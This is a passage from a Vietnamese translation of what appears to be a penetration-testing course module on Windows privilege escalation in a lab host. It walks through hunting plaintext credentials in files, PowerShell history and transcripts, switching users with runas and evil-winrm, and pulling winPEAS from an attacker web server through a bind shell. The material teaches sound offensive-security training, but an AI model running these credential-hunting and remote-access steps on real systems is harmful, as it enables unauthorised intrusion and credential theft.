     58      13      528       1088       0.00   2064   0 access                                                       
...                                                  
    369      32     9548      31320              2632   0 filezilla                                                    
...                                         
    188      29     9596      19716              3340   0 httpd                                                        
    486      49    16528      23060              4316   0 httpd                                                        
...                                                   
    205      17   210736      29228              3508   0 mysqld                                                       
...                                     
    982      32    83696      13780       0.59   2836   0 powershell                                                   
    587      28    65628      73752              9756   0 powershell                                                   
...
...
```

                                       *Listing 16 – Các process đang chạy trên CLIENTWK220*

Listing 16 hiển thị một danh sách rút gọn các process đang chạy trên CLIENTWK220. Nó bao gồm bind shell của chúng ta với ID 2064 và phiên PowerShell mà chúng ta đã khởi chạy cho quá trình enumeration với ID 9756.

Khi xem lại output của `netstat` trong Listing 14, chúng ta có thể xác nhận rằng process ID 3508 thuộc về mysqld và ID 4316 thuộc về Apache, được hiển thị là httpd.

Dựa trên thông tin trước đó khi liệt kê các ứng dụng đã cài đặt, chúng ta có thể suy ra rằng cả Apache và MySQL đều được khởi chạy thông qua XAMPP.

Chúng ta đã thu thập được một lượng lớn thông tin với các lệnh trước đó. Hãy tóm tắt ngắn gọn những gì chúng ta đã phát hiện về hệ thống mục tiêu:

Hệ thống là Windows 11 Pro 64-bit Build 22621 với một web server đang hoạt động trên các cổng 80 và 443, một MySQL server trên cổng 3306, bind shell của chúng ta trên cổng 4444, và một kết nối RDP đang hoạt động trên cổng 3389 từ 192.168.48.3. Ngoài ra, chúng ta còn phát hiện rằng KeePass Password Manager, 7-Zip và XAMPP đã được cài đặt trên hệ thống mục tiêu.

Những thông tin chúng ta thu thập được về user và group cũng như về bản thân hệ thống mục tiêu cung cấp một cái nhìn tổng quan tốt về máy. Trong phần tiếp theo, chúng ta sẽ tìm kiếm các thông tin nhạy cảm trên hệ thống mục tiêu và diễn giải chúng dựa trên những thông tin đã thu thập được trong quá trình situational awareness.

---

## 1.3. Ẩn ngay trước mắt

---

Dựa trên thông tin tìm được ở phần trước, chúng ta có thể giả định rằng các user trên CLIENTWK220 sử dụng một password manager. Tuy nhiên, chúng ta không bao giờ nên đánh giá thấp sự lười biếng của người dùng khi nói đến password và thông tin nhạy cảm. Thứ trước đây là tờ giấy Post-it với password dán dưới bàn phím thì giờ đây khá thường xuyên là một file văn bản trên desktop. Khi duyệt thư mục home của user của chúng ta hoặc các thư mục công khai có thể truy cập, chúng ta có thể lấy được nhiều mảnh thông tin nhạy cảm khác nhau, thứ có thể cung cấp cho chúng ta một vector để privilege escalation.

Ví dụ, thông tin nhạy cảm có thể được lưu trong meeting notes, file cấu hình, hoặc các tài liệu onboarding. Với thông tin đã thu thập trong quá trình situational awareness, chúng ta có thể đưa ra các suy đoán có cơ sở về nơi có thể tìm thấy các file như vậy.

Bây giờ, hãy tìm kiếm thông tin nhạy cảm trên CLIENTWK220. Chúng ta đã xác định rằng KeePass và XAMPP được cài đặt trên hệ thống và do đó, chúng ta nên tìm kiếm password manager database và các file cấu hình của những ứng dụng này.

Để làm điều này, chúng ta lại kết nối tới bind shell của hệ thống. Hãy bắt đầu tìm kiếm bằng cách nhập C:\ làm tham số cho `-Path` và `*.kdbx` làm tham số cho `-Include` để tìm tất cả các password manager database trên hệ thống với `Get-ChildItem` trong PowerShell.

```
PS C:\Users\dave> Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```

                              *Listing 17 – Tìm kiếm password manager database trên ổ C:\*

Listing 17 cho thấy không tìm thấy password manager database nào trong lần tìm kiếm của chúng ta.

Tiếp theo, hãy tìm kiếm thông tin nhạy cảm trong các file cấu hình của XAMPP. Sau khi xem tài liệu, chúng ta nhập `*.txt,*.ini` cho `-Include` vì các loại file này được ứng dụng sử dụng làm file cấu hình. Ngoài ra, chúng ta nhập `C:\xampp` làm tham số cho `-Path`.

```
PS C:\Users\dave> Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
...
Directory: C:\xampp\mysql\bin

Mode                 LastWriteTime         Length Name                                               
----                 -------------         ------ ----                                               
-a----         6/16/2022   1:42 PM           5786 my.ini
...
Directory: C:\xampp

Mode                 LastWriteTime         Length Name                                              
----                 -------------         ------ ----                                                                 
-a----         3/13/2017   4:04 AM            824 passwords.txt
-a----         6/16/2022  10:22 AM            792 properties.ini     
-a----         5/16/2022  12:21 AM           7498 readme_de.txt 
-a----         5/16/2022  12:21 AM           7368 readme_en.txt     
-a----         6/16/2022   1:17 PM           1200 xampp-control.ini  
```

                              *Listing 18 – Tìm kiếm thông tin nhạy cảm trong thư mục XAMPP*

Listing 18 cho thấy lần tìm kiếm của chúng ta trả về hai file có thể chứa thông tin nhạy cảm. File my.ini là file cấu hình của MySQL và passwords.txt chứa các password mặc định cho các thành phần XAMPP khác nhau. Hãy xem nội dung của chúng.

```
PS C:\Users\dave> type C:\xampp\passwords.txt
type C:\xampp\passwords.txt
### XAMPP Default Passwords ###

1) MySQL (phpMyAdmin):

   User: root
   Password:
   (means no password!)
...
   Postmaster: Postmaster (postmaster@localhost)
   Administrator: Admin (admin@localhost)

   User: newuser  
   Password: wampp 
...

PS C:\Users\dave> type C:\xampp\mysql\bin\my.ini
type C:\xampp\mysql\bin\my.ini
type : Access to the path 'C:\xampp\mysql\bin\my.ini' is denied.
At line:1 char:1
+ type C:\xampp\mysql\bin\my.ini
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\xampp\mysql\bin\my.ini:String) [Get-Content], UnauthorizedAccessEx 
   ception
    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
```

                                           *Listing 19 – Xem nội dung passwords.txt và my.ini*

Không may, file C:\xampp\passwords.txt chỉ chứa các password mặc định chưa bị chỉnh sửa của XAMPP. Hơn nữa, chúng ta không có permission để xem nội dung của C:\xampp\mysql\bin\my.ini.

Tiếp theo, hãy tìm các tài liệu và file văn bản trong thư mục home của user dave. Chúng ta nhập `*.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx` làm các phần mở rộng cần tìm và đặt `-Path` tới thư mục home.

```
PS C:\Users\dave> Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue

    Directory: C:\Users\dave\Desktop

Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         6/16/2022  11:28 AM            339 asdf.txt 
```

    *Listing 20 – Tìm kiếm file văn bản và password manager database trong thư mục home của dave*

Listing 20 cho thấy chúng ta đã tìm được một file văn bản trên desktop của dave tên là asdf.txt. Hãy kiểm tra nội dung file này.

```
PS C:\Users\dave> cat Desktop\asdf.txt
cat Desktop\asdf.txt
notes from meeting:

- Contractors won't deliver the web app on time
- Login will be done via local user credentials
- I need to install XAMPP and a password manager on my machine 
- When beta app is deployed on my local pc: 
Steve (the guy with long shirt) gives us his password for testing
password is: securityIsNotAnOption++++++
```

                                                             *Listing 21 – Nội dung của asdf.txt*

Lưu ý rằng chúng ta đã dùng `cat` thay vì `type` để hiển thị nội dung file trong listing trước. Thực tế, cả hai lệnh đều là alias của Cmdlet `Get-Content` trong PowerShell và do đó chúng ta có thể dùng chúng thay thế cho nhau.

Listing 21 cho thấy file này được dùng để ghi meeting notes. Ghi chú nói rằng web application sử dụng credential của local user và để test thì có thể dùng password của “Steve” là securityIsNotAnOption++++++.

Rất tốt!

Thông tin thu thập được trong quá trình situational awareness giờ đây trở nên hữu ích, vì chúng ta đã biết rằng một user tên steve tồn tại trên hệ thống mục tiêu.

Trước khi cố gắng tận dụng password này, hãy kiểm tra xem steve là thành viên của những group nào. Lần này, chúng ta sử dụng lệnh `net user` với username steve để thu thập thông tin này.

```
PS C:\Users\dave> net user steve
net user steve
User name                    steve
...
Last logon                   6/16/2022 1:03:52 PM

Logon hours allowed          All

Local Group Memberships      *helpdesk             *Remote Desktop Users 
                             *Remote Management Use*Users                
...
```

                                       *Listing 22 – Các local group mà user steve là thành viên*

Trong khi output của Listing 22 cho thấy steve không phải là thành viên của group Administrators, user này lại là thành viên của group Remote Desktop Users.

Hãy kết nối tới CLIENTWK220 bằng RDP với tư cách steve và mở PowerShell.

![image.png](image%201.png)

                                                    *Figure 2: RDP Connection as steve*

Do có quyền truy cập như một user mới, và do đó có các permission khác nhau đối với các file trên hệ thống, quá trình tìm kiếm thông tin nhạy cảm lại bắt đầu lại.

Đây là một cơ hội tốt để “zoom out” một chút. Khi có quyền truy cập tới một user mới, quá trình tìm kiếm thông tin nhạy cảm lại bắt đầu lại. Điều này không chỉ đúng với trường hợp cụ thể này, mà còn đúng với gần như tất cả các mảng của một penetration test. Tính chất lặp vòng (cyclical nature) của một penetration test là một khái niệm quan trọng mà chúng ta cần nắm bắt, vì nó cung cấp một mindset về việc liên tục đánh giá lại và đưa các thông tin và quyền truy cập mới vào, nhằm theo đuổi các vector tấn công trước đây chưa thể tiếp cận hoặc vừa mới được xác định.

Trong lần tìm kiếm với tư cách dave, chúng ta nhận được lỗi permission với C:\xampp\mysql\bin\my.ini. Hãy bắt đầu bằng việc kiểm tra xem chúng ta có thể truy cập file này với tư cách steve hay không.

```
PS C:\Users\steve> type C:\xampp\mysql\bin\my.ini
# Example MySQL config file for small systems.
...

# The following options will be passed to all MySQL clients
# backupadmin Windows password for backup job
[client]
password       = admin123admin123!
port=3306
socket="C:/xampp/mysql/mysql.sock"
```

                                                             *Listing 23 – Nội dung file my.ini*

Listing 23 cho thấy chúng ta có thể truy cập my.ini và hiển thị nội dung của nó. File này chứa password được đặt thủ công là admin123admin123!. Ngoài ra, một comment cho biết đây cũng là Windows password cho backupadmin.

Hãy xem các group mà backupadmin là thành viên để xác định liệu chúng ta có thể dùng các dịch vụ như RDP hoặc WinRM để kết nối tới hệ thống với tư cách user này hay không.

```
PS C:\Users\steve> net user backupadmin
User name                    BackupAdmin
...

Local Group Memberships      *Administrators       *BackupUsers
                             *Users
Global Group memberships     *None
The command completed successfully.
```

                                 *Listing 24 – Các local group mà backupadmin là thành viên*

Không may, backupadmin không phải là thành viên của các group Remote Desktop Users hoặc Remote Management Users. Điều này có nghĩa là chúng ta cần tìm một cách khác để truy cập hệ thống hoặc thực thi lệnh với tư cách backupadmin.

Vì chúng ta có quyền truy cập GUI, chúng ta có thể sử dụng Runas, cho phép chạy một chương trình với tư cách một user khác. Runas có thể được dùng với local hoặc domain account miễn là user có khả năng log on vào hệ thống.

Không có GUI thì chúng ta không thể dùng Runas vì password prompt không chấp nhận input của chúng ta trong các shell thường dùng, chẳng hạn như bind shell hoặc WinRM.

Tuy nhiên, chúng ta có thể sử dụng một vài phương pháp khác để truy cập hệ thống với tư cách một user khác khi một số yêu cầu nhất định được đáp ứng. Chúng ta có thể dùng WinRM hoặc RDP để truy cập hệ thống nếu user là thành viên của các group tương ứng. Ngoài ra, nếu user mục tiêu có quyền truy cập Log on as a batch job, chúng ta có thể schedule một task để thực thi chương trình mà chúng ta chọn với tư cách user đó. Hơn nữa, nếu user mục tiêu có một session đang hoạt động, chúng ta có thể dùng PsExec từ Sysinternals.

Vì chúng ta có quyền truy cập GUI, hãy dùng Runas trong PowerShell để khởi chạy cmd với tư cách user backupadmin. Chúng ta sẽ nhập username làm tham số cho `/user:` và câu lệnh mà chúng ta muốn thực thi. Khi thực thi lệnh, một password prompt sẽ xuất hiện, nơi chúng ta sẽ nhập password đã tìm thấy trước đó.

```
PS C:\Users\steve> runas /user:backupadmin cmd
Enter the password for backupadmin:
Attempting to start cmd as user "CLIENTWK220\backupadmin" ...

PS C:\Users\steve> 
```

                       *Listing 25 – Sử dụng Runas để thực thi cmd với tư cách user backupadmin*

Sau khi nhập password, một cửa sổ command line mới sẽ xuất hiện. Tiêu đề của cửa sổ mới cho biết đang chạy với tư cách CLIENTWK220\backupadmin.

Hãy dùng `whoami` để xác nhận command line đang hoạt động và chúng ta đúng là backupadmin.

![image.png](image%202.png)

                                     *Figure 3: Cmd running in the context of backupadmin*

Figure 3 cho thấy chúng ta đang thực thi lệnh với tư cách user backupadmin. Rất tốt!

Trong phần này, chúng ta đã tìm kiếm và tận dụng thông tin nhạy cảm trên CLIENTWK220 để thành công giành quyền truy cập từ dave sang steve và sau đó từ steve sang user có đặc quyền backupadmin. Chúng ta đã làm tất cả điều này mà không sử dụng bất kỳ exploit nào. Như đã học trong Module “Password Attacks”, khi tìm thấy password trong các file cấu hình hoặc file văn bản, chúng ta luôn nên thử chúng cho tất cả các user hoặc service có thể, vì password thường bị tái sử dụng.

---

## 1.4. Mỏ vàng thông tin PowerShell

---

Trong phần trước, chúng ta đã thảo luận cách có thể sử dụng thông tin nhạy cảm tìm thấy trong các file plain-text để nâng quyền. Trong thập kỷ vừa qua, nhận thức về IT security của người dùng doanh nghiệp trung bình đã được cải thiện rất mạnh thông qua đào tạo, chính sách IT, và mối đe dọa phổ biến của các cyber attack được truyền thông mô tả. May mắn là điều này đã dẫn đến việc ít thông tin nhạy cảm hơn bị lưu trong các ghi chú hoặc file văn bản.

Do mối đe dọa ngày càng tăng của các cyber attack, nhiều biện pháp phòng thủ hơn đã được phát triển và triển khai cho cả client lẫn server. Một trong các biện pháp đó là thu thập và ghi lại nhiều dữ liệu hơn trên hệ thống về các command và operation đã được thực thi, cho phép đội ngũ IT có thể xem xét và phản ứng phù hợp trước các mối đe dọa. Một nguồn thông tin quan trọng của dữ liệu này là PowerShell, vì nó là một tài nguyên quan trọng đối với attacker.

Với thiết lập mặc định, Windows chỉ ghi log một lượng nhỏ thông tin về việc sử dụng PowerShell, điều này không đủ cho môi trường enterprise. Do đó, chúng ta thường sẽ thấy các cơ chế PowerShell logging được bật trên các Windows client và server. Hai cơ chế logging quan trọng cho PowerShell là PowerShell Transcription và PowerShell Script Block Logging.

Transcription thường được gọi là “over-the-shoulder-transcription”, bởi vì khi được bật, thông tin được ghi log tương đương với những gì một người sẽ thu được khi nhìn qua vai một user đang nhập lệnh trong PowerShell. Thông tin được lưu trong các transcript file, thường được lưu trong các thư mục home của user, một thư mục trung tâm cho tất cả user của một máy, hoặc một network share thu thập các file từ tất cả các máy được cấu hình.

Script Block Logging ghi lại các command và các block mã script dưới dạng event trong quá trình thực thi. Điều này tạo ra việc ghi log thông tin rộng hơn nhiều vì nó ghi lại toàn bộ nội dung của code và command khi chúng được thực thi. Điều này có nghĩa là một event như vậy cũng chứa biểu diễn gốc của code hoặc command đã được encode.

Cả hai cơ chế này đều rất mạnh và đã trở nên ngày càng phổ biến trong môi trường enterprise. Tuy nhiên, dù chúng rất tuyệt từ góc nhìn phòng thủ, chúng thường chứa các thông tin giá trị đối với attacker.

Trong ví dụ này, chúng ta sẽ minh họa cách có thể truy xuất thông tin được PowerShell ghi lại với sự trợ giúp của các cơ chế logging đã được bật và PowerShell history. Chúng ta sẽ lại kết nối tới bind shell chạy trên port 4444 với tư cách user dave và khởi chạy PowerShell.

Vì mục đích minh họa, chúng ta sẽ giả định rằng các file chứa thông tin nhạy cảm ở phần trước không tồn tại.

Trước khi kiểm tra xem Script Block Logging hay PowerShell Transcription có được bật hay không, chúng ta luôn nên kiểm tra PowerShell history của một user. Chúng ta có thể dùng Cmdlet `Get-History` để lấy danh sách các command đã được thực thi trong quá khứ.

```
PS C:\Users\dave> Get-History
Get-History
```

                                                    *Listing 26 – Kết quả rỗng từ Get-History*

Output cho thấy rằng cho đến thời điểm này chưa có command PowerShell nào được thực thi.

Tại thời điểm này, chúng ta phải khám phá cách PowerShell history hoạt động. Hầu hết Administrator sử dụng lệnh `Clear-History` để xóa PowerShell history. Nhưng Cmdlet này chỉ xóa history nội bộ của PowerShell, thứ có thể được truy xuất bằng Get-History. Bắt đầu từ PowerShell v5, v5.1 và v7, một module tên là PSReadline được tích hợp, được dùng cho chức năng line-editing và command history.

Điều thú vị là Clear-History không xóa command history được PSReadline ghi lại. Do đó, chúng ta có thể kiểm tra xem user trong ví dụ này có hiểu nhầm Cmdlet Clear-History là xóa mọi dấu vết của các lệnh trước đó hay không.

Để lấy history từ PSReadline, chúng ta có thể dùng `Get-PSReadlineOption` để lấy thông tin từ module PSReadline. Chúng ta đặt nó trong dấu ngoặc đơn và thêm HistorySavePath với dấu chấm ở phía trước. Cú pháp này cho phép chúng ta lấy chỉ một option từ tất cả các option có sẵn của module.

```
PS C:\Users\dave> (Get-PSReadlineOption).HistorySavePath
(Get-PSReadlineOption).HistorySavePath
C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

                                *Listing 27 – Hiển thị đường dẫn file history từ PSReadline*

Listing 27 cho thấy đường dẫn tới file history từ PSReadline. Hãy hiển thị nội dung của file này.

```
PS C:\Users\dave> type C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
...
$PSVersionTable
Register-SecretVault -Name pwmanager -ModuleName SecretManagement.keepass -VaultParameters $VaultParams
Set-Secret -Name "Server02 Admin PW" -Secret "paperEarMonitor33@" -Vault pwmanager
cd C:\
ls
cd C:\xampp
ls
type passwords.txt
Clear-History
Start-Transcript -Path "C:\Users\Public\Transcripts\transcript01.txt"
Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
exit
Stop-Transcript
```

                                            *Listing 28 – Kết quả từ ConsoleHost_history.txt*

Output chứa nhiều command cực kỳ đáng quan tâm đối với chúng ta.

Đầu tiên, dave đã thực thi `Register-SecretVault` với module `SecretManagement.keepass`, điều này ngụ ý rằng user đã tạo một password manager database mới cho KeePass. Ở dòng tiếp theo, dave dùng `Set-Secret` để tạo một secret, hay một entry, trong password manager với tên Server02 Admin PW và password paperEarMonitor33@. Như tên gợi ý, đây rất có thể là credential cho một hệ thống khác. Tuy nhiên, chúng ta nên cố gắng tận dụng password này cho bất kỳ user, service, hoặc login nào trên CLIENTWK220 vì nó có thể bị user tái sử dụng. Tạm thời, chúng ta sẽ ghi lại password để dùng sau và tiếp tục phân tích history.

Tiếp theo, output cho thấy dave đã dùng Clear-History với niềm tin rằng history đã bị xóa sau khi thực thi Cmdlet.

Cuối cùng, dave đã dùng Start-Transcript để bắt đầu một PowerShell Transcription. Command này chứa đường dẫn nơi transcript file được lưu. Trước khi xem nó, hãy phân tích dòng tiếp theo.

User đã thực thi `Enter-PSSession` với hostname của máy local làm tham số cho `-ComputerName` và một `PSCredential` object tên $cred chứa username và password làm tham số cho -Credential. Các command để tạo PSCredential object không có trong history file và do đó chúng ta không biết user và password nào đã được dùng cho Enter-PSSession.

PowerShell Remoting theo mặc định sử dụng WinRM cho các Cmdlet như Enter-PSSession. Do đó, một user cần phải nằm trong local group Windows Management Users để trở thành user hợp lệ cho các Cmdlet này. Tuy nhiên, thay vì WinRM, SSH cũng có thể được sử dụng cho PowerShell remoting.

Hãy phân tích transcript file tại C:\Users\Public\Transcripts\transcript01.txt và kiểm tra xem chúng ta có thể làm rõ thêm về user và password đang được dùng hay không. Vì PowerShell Transcription bắt đầu trước khi Enter-PSSession được nhập, nó có thể chứa thông tin credential dạng plain-text được dùng để tạo PSCredential object lưu trong biến $cred.

```
PS C:\Users\dave> type C:\Users\Public\Transcripts\transcript01.txt
type C:\Users\Public\Transcripts\transcript01.txt
**********************
Windows PowerShell transcript start
Start time: 20220623081143
Username: CLIENTWK220\dave
RunAs User: CLIENTWK220\dave
Configuration Name: 
Machine: CLIENTWK220 (Microsoft Windows NT 10.0.22000.0)
Host Application: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Process ID: 10336
PSVersion: 5.1.22000.282
...
**********************
Transcript started, output file is C:\Users\Public\Transcripts\transcript01.txt
PS C:\Users\dave> $password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force
PS C:\Users\dave> $cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)
PS C:\Users\dave> Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
PS C:\Users\dave> Stop-Transcript
**********************
Windows PowerShell transcript end
End time: 20220623081221
**********************
```

                                                         *Listing 29 – Nội dung transcript file*

Listing 29 cho thấy transcript file thực sự chứa các command dùng để tạo biến $cred, vốn bị thiếu trong history file.

Để tạo PSCredential object đã thảo luận trước đó, một user trước hết cần tạo một SecureString để lưu password. Sau đó, user có thể tạo PSCredential object với username và password đã được lưu. Biến kết quả, chứa object này, có thể được dùng làm tham số cho -Credential trong các lệnh như Enter-PSSession.

Hãy copy ba lệnh được highlight và paste vào bind shell của chúng ta.

```
PS C:\Users\dave> $password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force
$password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force

PS C:\Users\dave> $cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)
$cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)

PS C:\Users\dave> Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred

[CLIENTWK220]: PS C:\Users\daveadmin\Documents> whoami
whoami
clientwk220\daveadmin
```

  *Listing 30 – Dùng các command từ transcript file để có PowerShell session dưới dạng daveadmin*

Output cho thấy chúng ta có thể dùng ba command này để khởi tạo một PowerShell remoting session qua WinRM trên CLIENTWK220 với tư cách user daveadmin. Trong khi whoami hoạt động, các command khác lại không.

```
[CLIENTWK220]: PS C:\Users\daveadmin\Documents> cd C:\
cd C:\

[CLIENTWK220]: PS C:\Users\daveadmin\Documents> pwd
pwd

[CLIENTWK220]: PS C:\Users\daveadmin\Documents> dir
dir
```

                              *Listing 31 – Không có output từ các command trong PSSession*

Listing 31 cho thấy chúng ta không nhận được output từ các command đã nhập. Chúng ta cần lưu ý rằng việc tạo một PowerShell remoting session qua WinRM trong một bind shell như trong ví dụ này có thể gây ra hành vi không như mong đợi.

Để tránh mọi vấn đề, hãy dùng evil-winrm để kết nối tới CLIENTWK220 qua WinRM từ máy Kali của chúng ta thay thế. Tool này cung cấp nhiều chức năng tích hợp phục vụ penetration testing như pass the hash, in-memory loading, và file upload/download. Tuy nhiên, chúng ta sẽ chỉ dùng nó để kết nối tới hệ thống mục tiêu qua WinRM nhằm tránh các vấn đề mà chúng ta gặp phải khi tạo PowerShell remoting session trong bind shell như đã thấy ở Listing 31.

Chúng ta nhập IP làm tham số cho -i, username cho -u, và password cho -p. Chúng ta cần escape cả hai ký tự “!” trong password.

```
kali@kali:~$ evil-winrm -i 192.168.50.220 -u daveadmin -p "qwertqwertqwert123\!\!"

Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\daveadmin\Documents> whoami
clientwk220\daveadmin
*Evil-WinRM* PS C:\Users\daveadmin\Documents> cd C:\
*Evil-WinRM* PS C:\> dir

    Directory: C:\

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         8/27/2024   3:22 AM                FileZilla
d-----          5/6/2022  10:24 PM                PerfLogs
d-r---         8/27/2024   3:20 AM                Program Files
d-r---          5/7/2022  12:40 AM                Program Files (x86)
d-----          7/4/2022   1:00 AM                tools
d-r---         8/21/2024   6:43 AM                Users
d-----         8/21/2024   6:47 AM                Windows
d-----         6/16/2022   1:17 PM                xampp
```

                  *Listing 32 – Dùng evil-winrm kết nối tới CLIENTWK220 với tư cách daveadmin*

Như Listing 32 cho thấy, bây giờ chúng ta có thể thực thi lệnh mà không gặp bất kỳ vấn đề nào. Tuyệt vời!

Các artifact của PowerShell như PSReadline history file hoặc transcript file thường là một kho báu chứa thông tin giá trị. Chúng ta không bao giờ nên bỏ qua việc xem chúng, vì hầu hết Administrator xóa history bằng Clear-History và do đó, PSReadline history vẫn còn nguyên để chúng ta phân tích.

Administrator có thể ngăn PSReadline ghi lại command bằng cách đặt option -HistorySaveStyle thành SaveNothing với Cmdlet `Set-PSReadlineOption`. Hoặc họ có thể xóa history file thủ công.

Trong phần này, chúng ta đã khám phá PowerShell Transcription như những cơ chế mạnh để ghi lại command và script trong PowerShell. Ngoài ra, chúng ta đã thảo luận cách và nơi PowerShell lưu history của nó. Chúng ta đã dùng kiến thức này trong một ví dụ để thu được password cho một hệ thống khác cũng như password cho user quản trị daveadmin.

---

## 1.5. Enumeration tự động

---

Trong ba phần trước, chúng ta đã enumerate CLIENTWK220 theo cách thủ công. Chúng ta đã thu thập thông tin, và điều đó dẫn chúng ta tới hai cách khác nhau để nâng quyền. Tuy nhiên, việc này đã mất khá nhiều thời gian. Trong một penetration test thực tế cho khách hàng, chúng ta thường bị ràng buộc bởi thời gian, hạn chế khoảng thời gian chúng ta có thể dành để enumerate hệ thống theo cách thủ công.

Vì vậy, chúng ta nên sử dụng các công cụ tự động để enumerate máy mục tiêu và cung cấp cho chúng ta kết quả về situational awareness cũng như các thông tin nhạy cảm tiềm năng theo một cách dễ tiêu thụ. Một công cụ như vậy là winPEAS.

*Các công cụ tự động có thể bị chặn bởi các giải pháp AV. Nếu điều này xảy ra, chúng ta có thể áp dụng các kỹ thuật đã học trong Module “Antivirus Evasion”, thử các công cụ khác như Seatbelt và JAWS, hoặc thực hiện enumeration thủ công.*

Khi chúng ta đã cài đặt package peass trên hệ thống Kali, chúng ta có thể copy file binary 64-bit của winPEAS vào thư mục home và khởi chạy một Python3 web server để phục vụ file đó.

```
kali@kali:~$ cp /usr/share/peass/winpeas/winPEASx64.exe .

kali@kali:~$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

                 *Listing 33 – Copy WinPEAS vào thư mục home và khởi chạy Python3 web server*

Hãy kết nối tới bind shell chạy trên port 4444 tại CLIENTWK220 với tư cách user dave như trước. Chúng ta khởi chạy PowerShell và dùng Cmdlet iwr với URL của file binary winPEAS làm tham số cho -Uri và winPeas.exe cho -Outfile.

```
kali@kali:~$ nc 192.168.50.220 4444
Microsoft Windows [Version 10.0.22000.318]
(c) Microsoft Corporation. All rights reserved.

C:\Users\dave> powershell
powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Users\dave> iwr -uri http://192.168.48.3/winPEASx64.exe -Outfile winPEAS.exe
iwr -uri http://192.168.48.3/winPEASx64.exe -Outfile winPEAS.exe
```

             *Listing 34 – Kết nối tới bind shell và chuyển file binary WinPEAS sang CLIENTWK220*

Bây giờ, hãy chạy chương trình winPEAS. Chương trình sẽ mất vài phút để chạy xong. Trong khi nó đang chạy, hãy xem phần legend output của winPEAS. Nó phân loại kết quả theo các màu khác nhau, cho biết các hạng mục đáng để kiểm tra sâu hơn (màu đỏ) và các thông tin quan trọng về các cơ chế bảo vệ (màu xanh lá).

```
C:\Users\dave> .\winPEAS.exe
...
+] Legend:
         Red                Indicates a special privilege over an object or something is misconfigured
         Green              Indicates that some protection is enabled or something is well configured
         Cyan               Indicates active users
         Blue               Indicates disabled users
         LightYellow        Indicates links
```

                                                  *Listing 35 – Legend output của winPEAS*

Sau khi chương trình chạy xong, hãy xem một số phát hiện của nó. Chúng ta bắt đầu với thông tin hệ thống cơ bản.

```
...
����������͹ Basic System Information
� Check if the Windows versions is vulnerable to some known exploit https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#kernel-exploits
    OS Name: Microsoft Windows 11 Pro
    OS Version: 10.0.22621 N/A Build 22621
    System Type: x64-based PC
    Hostname: clientwk220
    ProductName: Windows 10 Pro
    EditionID: Professional
    ReleaseId: 2009
    BuildBranch: ni_release
    CurrentMajorVersionNumber: 10
    CurrentVersion: 6.3
    Architecture: AMD64
    ProcessorCount: 2
    SystemLang: en-US
    KeyboardLang: English (United States)
    TimeZone: (UTC-08:00) Pacific Time (US & Canada)
    IsVirtualMachine: True
    Current Time: 9/2/2024 11:03:33 PM
    HighIntegrity: False
    PartOfDomain: False
    Hotfixes: 
...
```

                                            *Listing 36 – Basic System Information của winPEAS*

Listing 36 cho thấy winPEAS đã nhận diện máy mục tiêu là Windows 10 Pro thay vì Windows 11 như chúng ta đã xác lập trước đó. Điều này cho thấy chúng ta không bao giờ nên tin mù quáng vào output của một công cụ.

Tiếp theo, winPEAS cung cấp thông tin về các cơ chế bảo vệ bảo mật cũng như các thiết lập PowerShell và NTLM. Một trong các mục thông tin này là về transcript file.

```
...    
����������͹ PS default transcripts history
� Read the PS history inside these files (if any)
...
```

                                                         *Listing 37 – Danh sách transcript file*

Danh sách transcript file là rỗng, nhưng chúng ta biết rằng có một file tồn tại trong C:\Users\Public. Đây là một ví dụ khác về thông tin mà chúng ta sẽ bỏ lỡ nếu chỉ dựa vào output của công cụ mà không kết hợp công việc thủ công.

Tiếp theo, hãy kéo xuống phần output Users của winPEAS.

```
����������͹ Users
...    
Current user: dave
Current groups: Domain Users, Everyone, helpdesk, Builtin\Remote Desktop Users, Users, Batch, Console Logon, Authenticated Users, This Organization, Local account, Local, NTLM Authentication

   CLIENTWK220\Administrator(Disabled): Built-in account for administering the computer/domain
        |->Groups: Administrators
        |->Password: CanChange-NotExpi-Req

    CLIENTWK220\BackupAdmin
        |->Groups: BackupUsers,Administrators,Users
        |->Password: CanChange-NotExpi-Req

    CLIENTWK220\dave: dave
